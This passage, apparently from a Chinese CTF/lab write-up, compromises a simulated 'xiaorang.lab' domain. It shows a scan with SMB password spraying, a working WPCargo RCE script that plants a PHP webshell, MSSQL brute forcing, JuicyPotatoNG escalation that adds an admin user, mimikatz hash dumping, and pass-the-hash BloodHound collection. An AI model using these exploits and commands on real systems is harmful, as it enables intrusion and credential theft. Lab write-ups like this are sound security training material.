class="hljs-string">[7.9s] [*] 端口开放 172.22.2.18:22</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.34:445</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.34:139</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.34:135</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.18:139</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.18:445</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.7:6379</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.7:80</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.7:22</span><br><span class="hljs-string">[7.9s] [*] 端口开放 172.22.2.7:21</span><br><span class="hljs-string">[10.9s]     扫描完成, 发现 21 个开放端口</span><br><span class="hljs-string">[10.9s]     存活端口数量: 21</span><br><span class="hljs-string">[10.9s]     开始漏洞扫描</span><br><span class="hljs-string">[11.0s] [*] 网站标题 http://172.22.2.7         状态码:200 长度:4833   标题:Welcome to CentOS</span><br><span class="hljs-string">[11.0s] [+] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable</span><br><span class="hljs-string">[11.0s] [*] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.22.2.34</span><br><span class="hljs-string">主机名: CLIENT01</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.22.2.34</span><br><span class="hljs-string">[11.0s] [*] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.22.2.16</span><br><span class="hljs-string">主机名: MSSQLSERVER</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.22.2.16</span><br><span class="hljs-string">[11.0s] [*] NetInfo 扫描结果</span><br><span class="hljs-string">目标主机: 172.22.2.3</span><br><span class="hljs-string">主机名: DC</span><br><span class="hljs-string">发现的网络接口:</span><br><span class="hljs-string">   IPv4地址:</span><br><span class="hljs-string">      └─ 172.22.2.3</span><br><span class="hljs-string">[11.0s] [*] 网站标题 http://172.22.2.16        状态码:404 长度:315    标题:Not Found</span><br><span class="hljs-string">[11.1s] [+] NetBios 172.22.2.34     XIAORANG\CLIENT01             </span><br><span class="hljs-string">[11.1s]     POC加载完成: 总共387个，成功387个，失败0个</span><br><span class="hljs-string">[11.1s]     系统信息 172.22.2.16 [Windows Server 2016 Datacenter 14393]</span><br><span class="hljs-string">[11.1s] [+] NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393</span><br><span class="hljs-string">[11.1s]     系统信息 172.22.2.3 [Windows Server 2016 Datacenter 14393]</span><br><span class="hljs-string">[11.1s] [+] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393</span><br><span class="hljs-string">[11.1s] [+] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        </span><br><span class="hljs-string">[11.2s] [+] FTP服务 172.22.2.7:21 匿名登录成功!</span><br><span class="hljs-string">[11.2s] [+] SMB认证成功 172.22.2.18:445 administrator:admin123</span><br><span class="hljs-string">[11.4s]     SMB2共享信息 172.22.2.18:445 administrator Pass:P@ssword123 共享:[print$ IPC$]</span><br><span class="hljs-string">[11.6s] [+] SMB认证成功 172.22.2.16:445 admin:admin123</span><br><span class="hljs-string">[11.7s]     SMB2共享信息 172.22.2.18:445 administrator Pass:123456 共享:[print$ IPC$]</span><br><span class="hljs-string">[11.8s]     SMB2共享信息 172.22.2.18:445 administrator Pass:root 共享:[print$ IPC$]</span><br><span class="hljs-string">[11.8s]     SMB2共享信息 172.22.2.18:445 administrator Pass: 共享:[print$ IPC$]</span><br><span class="hljs-string">[11.9s]     SMB2共享信息 172.22.2.18:445 administrator Pass:admin123 共享:[print$ IPC$]</span><br><span class="hljs-string">[12.1s]     SMB2共享信息 172.22.2.16:445 admin Pass:root 共享:[ADMIN$ C$ fileshare IPC$]</span><br><span class="hljs-string">[12.1s]     SMB2共享信息 172.22.2.16:445 admin Pass:123456 共享:[ADMIN$ C$ fileshare IPC$]</span><br><span class="hljs-string">[12.1s]     SMB2共享信息 172.22.2.18:445 administrator Pass:admin 共享:[print$ IPC$]</span><br><span class="hljs-string">[12.1s]     SMB2共享信息 172.22.2.18:445 administrator Pass:pass123 共享:[print$ IPC$]</span><br><span class="hljs-string">[12.1s]     SMB2共享信息 172.22.2.18:445 administrator Pass:Password 共享:[print$ IPC$]</span><br><span class="hljs-string">[12.1s]     SMB2共享信息 172.22.2.16:445 admin Pass:admin 共享:[ADMIN$ C$ fileshare IPC$]</span><br><span class="hljs-string">[12.1s]     SMB2共享信息 172.22.2.16:445 admin Pass:admin123 共享:[ADMIN$ C$ fileshare IPC$]</span><br><span class="hljs-string">[12.2s]     SMB2共享信息 172.22.2.16:445 admin Pass:pass123 共享:[ADMIN$ C$ fileshare IPC$]</span><br><span class="hljs-string">[12.2s]     SMB2共享信息 172.22.2.16:445 admin Pass:pass@123 共享:[ADMIN$ C$ fileshare IPC$]</span><br><span class="hljs-string">[12.2s]     SMB2共享信息 172.22.2.16:445 admin Pass:P@ssword123 共享:[ADMIN$ C$ fileshare IPC$]</span><br><span class="hljs-string">[12.3s]     SMB2共享信息 172.22.2.18:445 administrator Pass:pass@123 共享:[print$ IPC$]</span><br><span class="hljs-string">[12.3s]     SMB2共享信息 172.22.2.16:445 admin Pass:Password 共享:[ADMIN$ C$ fileshare IPC$]</span><br><span class="hljs-string">[12.3s]     SMB2共享信息 172.22.2.16:445 admin Pass:password 共享:[ADMIN$ C$ fileshare IPC$]</span><br><span class="hljs-string">[12.4s]     SMB2共享信息 172.22.2.18:445 administrator Pass:password 共享:[print$ IPC$]</span><br><span class="hljs-string">[14.0s] [+] Redis 172.22.2.7:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb</span><br><span class="hljs-string">[14.0s] [+] Redis无密码连接成功: 172.22.2.7:6379</span><br><span class="hljs-string">[55.4s]     扫描已完成: 37/37 </span><br></code></pre></td></tr></table></figure><p>有以下资产</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">172.22.2.3DC<br>172.22.2.16MSSQLSERVER<br>172.22.2.18UBUNTU-WEB02<br>172.22.2.34CLIENT01<br></code></pre></td></tr></table></figure><p>先看 172.22.2.18 ，有 web 服务，用了 WordPress，wpscan 扫</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs sh">[+] Headers<br> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://172.22.2.18/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://172.22.2.18/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Upload directory has listing enabled: http://172.22.2.18/wp-content/uploads/<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://172.22.2.18/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://172.22.2.18/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0&lt;/generator&gt;<br> |  - http://172.22.2.18/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentytwentytwo<br> | Location: http://172.22.2.18/wp-content/themes/twentytwentytwo/<br> | Last Updated: 2025-04-15T00:00:00.000Z<br> | Readme: http://172.22.2.18/wp-content/themes/twentytwentytwo/readme.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 2.0<br> | Style URL: http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2<br> | Style Name: Twenty Twenty-Two<br> | Style URI: https://wordpress.org/themes/twentytwentytwo/<br> | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.2 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2, Match: <span class="hljs-string">&#x27;Version: 1.2&#x27;</span><br><br>[+] Enumerating All Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br><br>[i] Plugin(s) Identified:<br><br>[+] wpcargo<br> | Location: http://172.22.2.18/wp-content/plugins/wpcargo/<br> | Last Updated: 2025-07-23T01:11:00.000Z<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 8.0.2<br> |<br> | Found By: Urls In Homepage (Passive Detection)<br> |<br> | Version: 6.x.x (80% confidence)<br> | Found By: Readme - Stable Tag (Aggressive Detection)<br> |  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt<br></code></pre></td></tr></table></figure><p>WordPress 的插件 wpcargo 有问题，<a href="https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/">WPCargo &lt; 6.9.0 - Unauthenticated RCE</a>，找到 poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># This is a magic string that when treated as pixels and compressed using the png</span><br><span class="hljs-comment"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span><br>payload = <span class="hljs-string">&#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_character_code</span>(<span class="hljs-params">c: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c).replace(<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>)<br><br>text = <span class="hljs-string">&#x27;&#x27;</span>.join([encode_character_code(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> binascii.unhexlify(payload)])[<span class="hljs-number">1</span>:]<br><br>destination_url = <span class="hljs-string">&#x27;http://172.22.2.18/&#x27;</span><br>cmd = <span class="hljs-string">&#x27;ls&#x27;</span><br><br><span class="hljs-comment"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span><br>requests.get(<br>    <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;destination_url&#125;</span>wp-content/plugins/wpcargo/includes/barcode.php?text=<span class="hljs-subst">&#123;text&#125;</span>&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span><br>)<br><br><span class="hljs-comment"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span><br><span class="hljs-built_in">print</span>(requests.post(<br>    <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;destination_url&#125;</span>webshell.php?1=system&quot;</span>, data=&#123;<span class="hljs-string">&quot;2&quot;</span>: cmd&#125;<br>).content.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>, <span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure><p>蚁剑连接，在 wp-config.php 找到数据库的配置</p><p><img src="https://img.dkdun.cn/v1/2025/12/920fe2a583f41158.png"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">wpuser:</span>WpuserEha8Fgj9<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/087e9e261bb93ee3.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;c757e423-eb44-<span class="hljs-number">459</span>c-<span class="hljs-number">9</span>c63-<span class="hljs-number">7625009910</span>d8&#125;<br></code></pre></td></tr></table></figure><h1 id="mssql-爆破"><a href="#mssql-爆破" class="headerlink" title="mssql 爆破"></a>mssql 爆破</h1><p>把 f1aagggghere 下的 S0meth1ng_y0u_m1ght_1ntereSted 数据导出来</p><p><img src="https://img.dkdun.cn/v1/2025/12/1efa5890ec13fd39.png"></p><p>里面有 id 和 password</p><p>对 172.22.2.16 进行爆破，拿到密码 ElGNkOiC</p><p><img src="https://img.dkdun.cn/v1/2025/12/a7a91c5715281571.png"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">sa:</span>ElGNkOiC<br></code></pre></td></tr></table></figure><p>用蚁剑能连接上，但是没有数据，用 <strong><a href="https://github.com/SafeGroceryStore/MDUT">MDUT</a></strong> 连接，只有 mssqlserver 权限</p><p><img src="https://img.dkdun.cn/v1/2025/12/baaaa6801e726a4f.png"></p><p>直接添加用户不行的，查看特权</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">whoami /priv<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ab1d017eb02f3836.png"></p><p>发现开启了 <code>SeImpersonatePrivilege</code> 特权，那么就能想到可以用土豆提权，<a href="https://www.cnblogs.com/kqdssheng/p/18738762">Windows 提权-SeImpersonatePrivilege 特权</a>，上传到机器中</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-type">C</span>:\迅雷下载\<span class="hljs-type">JuicyPotatoNG</span>.exe -t * -p <span class="hljs-string">&quot;C:\windows\system32\cmd.exe&quot;</span> -a <span class="hljs-string">&quot;/c whoami &gt; C:\迅雷下载\butt3rf1y.txt&quot;</span> &amp; <span class="hljs-keyword">type</span> <span class="hljs-type">C</span>:\迅雷下载\butt3rf1y.txt<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/3c4a30ce5a4dd888.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">C:\迅雷下载\<span class="hljs-title">JuicyPotatoNG.exe</span> -<span class="hljs-title">t</span> * -<span class="hljs-title">p</span> &quot;<span class="hljs-title">C</span>:\<span class="hljs-title">windows</span>\<span class="hljs-title">system32</span>\<span class="hljs-title">cmd.exe</span>&quot; -<span class="hljs-title">a</span> &quot;/<span class="hljs-title">c</span> <span class="hljs-title">net</span> <span class="hljs-title">user</span> <span class="hljs-title">butt3rf1y</span> <span class="hljs-title">butt3rf1y</span> /<span class="hljs-title">add</span> &gt; <span class="hljs-title">C</span>:\迅雷下载\<span class="hljs-title">butt3rf1y.txt</span>&quot; &amp; <span class="hljs-title">type</span> <span class="hljs-title">C</span>:\迅雷下载\<span class="hljs-title">butt3rf1y.txt</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\迅雷下载\<span class="hljs-title">JuicyPotatoNG.exe</span> -<span class="hljs-title">t</span> * -<span class="hljs-title">p</span> &quot;<span class="hljs-title">C</span>:\<span class="hljs-title">windows</span>\<span class="hljs-title">system32</span>\<span class="hljs-title">cmd.exe</span>&quot; -<span class="hljs-title">a</span> &quot;/<span class="hljs-title">c</span> <span class="hljs-title">net</span> <span class="hljs-title">localgroup</span> <span class="hljs-title">administrators</span> <span class="hljs-title">butt3rf1y</span> /<span class="hljs-title">add</span> &gt; <span class="hljs-title">C</span>:\迅雷下载\<span class="hljs-title">butt3rf1y.txt</span>&quot; &amp; <span class="hljs-title">type</span> <span class="hljs-title">C</span>:\迅雷下载\<span class="hljs-title">butt3rf1y.txt</span></span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/718bd6d23f0efef1.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag03</span>: flag&#123;<span class="hljs-number">44</span>e05a29-<span class="hljs-number">8554</span>-<span class="hljs-number">4</span>b0a-<span class="hljs-number">85</span>c6-ec3811ef6199&#125;<br></code></pre></td></tr></table></figure><h1 id="S4U-伪造权限-ST-拿下域控"><a href="#S4U-伪造权限-ST-拿下域控" class="headerlink" title="S4U 伪造权限 ST 拿下域控"></a>S4U 伪造权限 ST 拿下域控</h1><p>minikatz 抓 hash</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/b42c3fa3d89fe428.png"></p><p>发现有域内用户 William 及其信息，但是登录不上去</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cmd">Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">283669</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">00045415</span>)<br>Session           : Interactive from <span class="hljs-number">1</span><br>User Name         : William<br>Domain            : XIAORANG<br>Logon Server      : DC<br>Logon <span class="hljs-built_in">Time</span>        : <span class="hljs-number">2025</span>/<span class="hljs-number">8</span>/<span class="hljs-number">13</span> <span class="hljs-number">17</span>:<span class="hljs-number">49</span>:<span class="hljs-number">06</span><br>SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2704639352</span>-<span class="hljs-number">1689326099</span>-<span class="hljs-number">2164665914</span>-<span class="hljs-number">1106</span><br>        msv :<br>         [<span class="hljs-number">00000003</span>] Primary<br>         * Username : William<br>         * Domain   : XIAORANG<br>         * NTLM     : <span class="hljs-number">8853911</span>fd59e8d0a82176e085a2157de<br>         * SHA1     : e4fd18cfd47b9a77836c82283fb560e6f465bc40<br>         * DPAPI    : da3fc187c1ff105853ec62c10cddd26b<br>        tspkg :<br>        wdigest :<br>         * Username : William<br>         * Domain   : XIAORANG<br>         * Password : (null)<br>        kerberos :<br>         * Username : William<br>         * Domain   : XIAORANG.LAB<br>         * Password : Willg1UoO6Jt<br>        ssp :<br>        credman :<br></code></pre></td></tr></table></figure><p>以及域内 MSSQLSERVER$ 用户</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cmd">Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">8099440</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">007</span>b9670)<br>Session           : Interactive from <span class="hljs-number">4</span><br>User Name         : DWM-<span class="hljs-number">4</span><br>Domain            : Window Manager<br>Logon Server      : (null)<br>Logon <span class="hljs-built_in">Time</span>        : <span class="hljs-number">2025</span>/<span class="hljs-number">8</span>/<span class="hljs-number">13</span> <span class="hljs-number">20</span>:<span class="hljs-number">19</span>:<span class="hljs-number">01</span><br>SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">90</span>-<span class="hljs-number">0</span>-<span class="hljs-number">4</span><br>        msv :<br>         [<span class="hljs-number">00000003</span>] Primary<br>         * Username : MSSQLSERVER$<br>         * Domain   : XIAORANG<br>         * NTLM     : aca5ebbdd95f1c76b5d201c37d3d345b<br>         * SHA1     : <span class="hljs-number">41</span>ef4222b0a2dd8b549ec6b9fe8de87cd6eff68e<br>        tspkg :<br>        wdigest :<br>         * Username : MSSQLSERVER$<br>         * Domain   : XIAORANG<br>         * Password : (null)<br>        kerberos :<br>         * Username : MSSQLSERVER$<br>         * Domain   : xiaorang.lab<br>         * Password : <span class="hljs-number">9</span>a <span class="hljs-number">5</span>a <span class="hljs-number">6</span>d e6 da f8 de b8 <span class="hljs-number">91</span> <span class="hljs-number">89</span> <span class="hljs-number">0</span>c f7 <span class="hljs-number">70</span> <span class="hljs-number">8</span>d ec <span class="hljs-number">42</span> <span class="hljs-number">05</span> c5 a0 <span class="hljs-number">5</span>f c3 <span class="hljs-number">46</span> <span class="hljs-number">3</span>b <span class="hljs-number">37</span> bf <span class="hljs-number">50</span> c9 <span class="hljs-number">2</span>f <span class="hljs-number">9</span>e b0 <span class="hljs-number">94</span> dd <span class="hljs-number">8</span>a <span class="hljs-number">06</span> <span class="hljs-number">8</span>b <span class="hljs-number">15</span> a2 e0 <span class="hljs-number">4</span>d f9 e9 <span class="hljs-number">34</span> <span class="hljs-number">3</span>d <span class="hljs-number">3</span>a eb ef <span class="hljs-number">9</span>c <span class="hljs-number">53</span> <span class="hljs-number">6</span>a a5 <span class="hljs-number">4</span>a c9 <span class="hljs-number">2</span>e <span class="hljs-number">86</span> <span class="hljs-number">7</span>f d7 <span class="hljs-number">92</span> <span class="hljs-number">6</span>e <span class="hljs-number">76</span> <span class="hljs-number">46</span> <span class="hljs-number">04</span> <span class="hljs-number">03</span> <span class="hljs-number">18</span> <span class="hljs-number">9</span>d <span class="hljs-number">8</span>c <span class="hljs-number">6</span>f fd <span class="hljs-number">7</span>e d2 <span class="hljs-number">7</span>b a6 <span class="hljs-number">34</span> b6 <span class="hljs-number">69</span> <span class="hljs-number">2</span>b c1 <span class="hljs-built_in">cd</span> <span class="hljs-number">94</span> <span class="hljs-number">3</span>e <span class="hljs-number">95</span> <span class="hljs-number">69</span> <span class="hljs-number">4</span>d ff ad <span class="hljs-number">24</span> <span class="hljs-number">8</span>b <span class="hljs-number">15</span> e0 <span class="hljs-number">83</span> <span class="hljs-number">99</span> dc <span class="hljs-number">4</span>b <span class="hljs-number">8</span>d fd a5 d5 <span class="hljs-number">54</span> <span class="hljs-number">62</span> <span class="hljs-number">0</span>c dd fc <span class="hljs-number">9</span>c <span class="hljs-number">8</span>e <span class="hljs-number">8</span>a <span class="hljs-number">86</span> <span class="hljs-number">9</span>f ad <span class="hljs-number">91</span> <span class="hljs-number">8</span>d <span class="hljs-number">41</span> <span class="hljs-number">1</span>f <span class="hljs-number">9</span>c <span class="hljs-number">37</span> e0 <span class="hljs-number">86</span> db ff b7 c2 ae <span class="hljs-number">81</span> <span class="hljs-number">68</span> ec <span class="hljs-number">58</span> <span class="hljs-number">8</span>e <span class="hljs-number">64</span> <span class="hljs-number">01</span> cf <span class="hljs-number">8</span>d aa b5 <span class="hljs-number">45</span> <span class="hljs-number">96</span> <span class="hljs-number">2</span>b <span class="hljs-number">0</span>c eb <span class="hljs-number">76</span> <span class="hljs-number">72</span> <span class="hljs-number">01</span> <span class="hljs-number">57</span> <span class="hljs-number">03</span> <span class="hljs-number">26</span> <span class="hljs-number">54</span> <span class="hljs-number">2</span>a <span class="hljs-number">0</span>a f7 <span class="hljs-number">38</span> cb da <span class="hljs-number">8</span>c <span class="hljs-number">73</span> <span class="hljs-number">32</span> ac <span class="hljs-number">12</span> c6 <span class="hljs-number">71</span> <span class="hljs-number">50</span> <span class="hljs-number">3</span>c e9 <span class="hljs-number">7</span>a <span class="hljs-number">3</span>e <span class="hljs-number">46</span> <span class="hljs-number">3</span>e <span class="hljs-number">4</span>e d8 <span class="hljs-number">75</span> d3 d4 b7 e4 <span class="hljs-number">23</span> <span class="hljs-number">8</span>e <span class="hljs-number">37</span> <span class="hljs-number">02</span> b5 <span class="hljs-number">68</span> a1 <span class="hljs-number">10</span> cc <span class="hljs-number">7</span>c f9 <span class="hljs-number">3</span>c <span class="hljs-number">37</span> b5 a1 <span class="hljs-number">3</span>b <span class="hljs-number">14</span> <span class="hljs-number">7</span>c dc <span class="hljs-number">81</span> <span class="hljs-number">64</span> <span class="hljs-number">9</span>e <span class="hljs-number">09</span> b5 <span class="hljs-number">85</span> <span class="hljs-number">22</span> <span class="hljs-number">85</span> b4 <span class="hljs-number">1</span>b d9 <span class="hljs-number">4</span>f f4 a9 e2 <span class="hljs-number">1</span>a <span class="hljs-number">57</span> <span class="hljs-number">25</span> <span class="hljs-number">1</span>f f2 ad <span class="hljs-number">7</span>c ee da <span class="hljs-built_in">cd</span> <span class="hljs-number">2</span>b <span class="hljs-number">1</span>a ab <span class="hljs-number">76</span> ba <span class="hljs-number">76</span> <span class="hljs-number">5</span>a <span class="hljs-number">3</span>d <span class="hljs-number">8</span>e e9 ea c2 d3 <span class="hljs-number">8</span>a <span class="hljs-number">87</span> <span class="hljs-number">53</span> <span class="hljs-number">84</span> d6 <span class="hljs-number">4</span>e <span class="hljs-number">7</span>e <span class="hljs-number">55</span> <span class="hljs-number">6</span>d <span class="hljs-number">9</span>e fe <span class="hljs-number">36</span> e6<br>        ssp :<br>        credman :<br><br></code></pre></td></tr></table></figure><p>dump 域信息并查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains bloodhound-python -d XIAORANG.LAB -u <span class="hljs-string">&#x27;MSSQLSERVER$&#x27;</span> --hashes aca5ebbdd95f1c76b5d201c37d3d345b:aca5ebbdd95f1c76b5d201c37d3d345b -dc DC.XIAORANG.LAB -c all -ns 172.22.2.3 --dns-tcp --zip<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/4a988b83fbca73b8.png"></p><p>可以通过 S4U 伪造 ST 拿下域控，用 Rubeus 申请访问自身的服务票据，拿到票据，注入票据，一步到位</p><p><img src="https://img.dkdun.cn/v1/2025/12/b0a2416dce67f1b4.png"></p><figure class="highlight 